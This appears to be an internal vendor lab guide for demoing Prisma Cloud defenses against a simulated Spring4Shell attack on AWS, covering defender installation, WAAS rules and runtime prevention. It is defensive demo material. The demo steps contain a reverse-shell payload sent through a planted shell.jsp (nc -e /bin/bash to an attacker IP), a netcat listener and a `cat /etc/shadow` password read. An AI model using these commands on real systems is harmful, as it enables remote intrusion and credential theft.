# Lab for simulating Spring4Shell Attack on AWS and Protecting with Prisma Cloud

These set of instructions are written to incorporate several compnonents.  Namely:
- Discuss how we offer Agentless and the Pros & Cons of Agentless only
- The recent Critical Vulnerabilities such as Log4Shell & Spring4Shell and noting there are always yet to be discovered ones
- Why any public facing workloads need Agents & Deploying a Container Defender
- Why WAAS & enabling it

## Prerequisites - ADD TO THIS

## Things to Know
Some important points to understand with the current lab scripts and setup.

1. It will deploy 2 host machines and a container on one of the vulnerable machine.
2. When running the attack, different events and incidents will occur on both the vulnerable host and the container.
3. Because of this, it helps to understand the layers of the attack and commands that you will run.
4. It also helps to understand what rules you are setting and the particular parts of the attack that each rule alerts/prevents.
5. Make sure you run this lab at least a couple times to understand these things so you are prepared to explain/answer questions when demoing.
6. Feel free to also make any suggestions/enhancements to this lab!
    
Do all of the following steps in advance of the demo

## Lab Setup
Refer to Internal Spring4Shell Docs at this time until can rewrite for sharing. 

- Complete all initial setup steps and Steps 1 & 2 of the 'Perform Attack Steps' and before runing the exploit script in Step 3.
- Copy all the commands in the following steps in a notepad and pre-enter the Target-IP address.  This will save time in demo.
- Login to Prisma Cloud and Initiate both:
    - (Optional, noting that we only scan Hosts at this time, so will only get results for the Host and see error for container) Agentless Scan - Monitor > Vulnerabilities > Host > Scan Agentless
    - (Optional) Cloud Discovery on AWS - Monitor > Compliance > Cloud Discovery > Click on your account/EC2 service line.  Verify the new instances are shown here and as not defended.

## Install Defender
1. SSH to your spring4shell instance (not Kali), inserting your instance's IP address
```
ssh -i temp-lab/spring4shell_cloud_breach/terraform/panw ubuntu@<spring4shell-ubuntu-lab IP>
```
2. Refer to [Install Defenders](https://github.com/jjchavanne/cheat-sheets/blob/main/prisma-cloud/Install_Defenders.md) instructions and
    - install twistci
    - export variables
    - install a container defender
3. Verify in the Console that it recognizes a Defender is now installed on device

## Setup WAAS Rule
1. Go to Prisma Console (Enterprise Edition ONLY) - **Compute > Defend > WAAS > Host**
2. Click **‘Add Rule’**
3. Rule Name: **Spring4Shell Defense**
4. Then click in the **'Scope'** field
5. Make sure there is a Check box next to **All**.  Alternatively you can create a rule specific for this vulnerable Host.
    - Step 5a: (OPTIONAL) If writing a specifc rule (not All) and there are no Collections for your Host, click **'Add Collection'**, type in a name, Click in the **Host** field, select your vulnerable Host instance, and click **'Save'**
    - Step 5b: Ensure you have your desired collection box checked and click **'Select collections'**
6. Click **‘Add New App’**
7. On the next pop-up click the **‘+ Add Endpoint’**
8. Enter **80** for App port (internal port) then hit **‘Create’**
9. Click the **‘App Firewall'** tab and confirm all settings are set to **Alert**, (with exception to Detect Information Leakage which should be set to Disable by default). 
10. Click **‘Save’**

NOTE: For performing the demo, suggest to **'Disable'** the alert temporarily and Allow Prisma Cloud to Discover the 
Vulnerable Host and Container in the Radars view after installing the defender during the demo and that it shows that it is an Unprotected Web App.**. 

## Pre-Demo verification Steps
1. Verify on **Compute > Radars > Container** screen, the new vulnerable container has completed learning mode and shows the red firewall with a line through it, indicating it is an unprotected Web App
    - This make take 10-20 mins after installing the Defender to show up.
2. Verify in **Compute > Monitor > Compliance > Cloud Discovery > Your Credentail/EC2 Service Line** shows the expected number of devices Defended.  The Kali Attacker machine should not be.  Ensure to state this in the demo if you show this.
3. 

## Begin Demo - REFACTOR
1. If you left the WAAS Rule(s) Disabled, then first Navigate to **Compute > Radars > Containers** and show the red firewall with a line through it. Click the **vuln_app_app** and highlight that it was recognized as a **Unprotected Web App**
2. Show vulnerabilities and Compliance issue.
3. Either from the Container screen itself, Click the **Defend** button OR or through **Defend > WAAS**, go to the **Host** tab and Enable the WAAS rule.  Make sure you enable the **Host WAAS Rule, not a Container one**.
4. Show that the WAAS is only in Alert mode for now.
5. Run the attack 
    - `bash /tmp/exploit.sh`
    - Remotely Install packages, install netcat with curl commands
    - Open 2nd terminal and run `nc -lvnp 9001`
    - Send the payload to gain a reverse shell 
```
curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2010.0.2.160%209001
```
    - Run some commands in the reverse shell terminal.
7. Discuss what the attacker was able to do.
    - i.e. Remote Code Execution, run commands like `cat /etc/shadow` to gain passwords.
    - Gain a reverse shell and run commands directly

### Show the events
1. Navigate to **Compute > Monitor > Events > WAAS for hosts** and scroll to bottom.  Should see events for these attacks.  Discuss both.
    - Code Injection
    - Local File Inclusion
2. Navigate to **Compute > Radars > Hosts** Locate the new Host and should show red hue around.  Click and show that it has been involved in an Incident.
3. Navigate to **Compute > Monitor > Runtime > Incident Explorer** Should see incidents for these attacks.
    - Reverse Shell
    - Lateral Movement
4. Discuss both, including viewing Forensic Data, showing the command in the Events

### Turn on Defenses in Prisma Cloud
1. Block Reverse Shell 
    - Exit the reverse shell in your terminal with **Control + C**
    - In Prisma Cloud, Navigate to **Compute > Defend > Runtime > Container Policy** and Click the 3 dots to the far right on the rule and **Edit**.  Go to the **Processes** tab and change from Alert to **Prevent**
    - Rerun nc command from terminal
    - Reexecute payload command from other teminal.  
    - This time, you should some long error message in the attacker's terminal and it should be blocked.  Navigate to Prisma Cloud to show event.
2. REFACTOR & SYNC WITH STEPS 3&4 IN 'BEGIN DEMO' SECTION - Alert on Code Injection & Local File Inclusion
    - Enable the Host WAAS Rule you created in prep
    - Re-run the bash exploit script `bash /tmp/exploit.sh`
    - Show the Events under **Compute > Monitor > Events > WAAS for Hosts**.  If there are mutiple counts, Zoom in on the latest.
3. Prevent the Code Injection & Local File Inclusion Attacks
    - Edit the Host WAAS Rule to Prevent
    - Re-run attack and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script
    - Show in Primsa Cloud the event was Blocked/Prevented
4. Prevent Container with Critical Vulnerabilities from even running
    - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed
    - In the spring4shell-ubuntu terminal, kill the current container
        - Get the container ID of **vuln_app_app** `docker ps`
        - `docker kill <ID>`
    - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
    - You should see a message that Image is blocked by your policy.

## Future - Build out connection AWS registry, Github repo, full workflow.
To Do's
- Create repo with Dockerfile and app files
- SYnc up with Prisma Cloud
- Add CI tools to push to ECR
- Setup Scan of Repos/Registries
- Setup to be able to pull images from registry to vulnerable instance

## Cleanup
1. Disable Host WAAS rule
2. Change Runtime Container Policy, Processes from Prevent to Alert
3. Exit SSH sessions and run the `bash destroy-lab.sh` script


## Other Notes
There are some additional improvements. Such as:
- Editing the output messages in the exploit script to not echo if being blocked.  As of now it prints the message regardless.
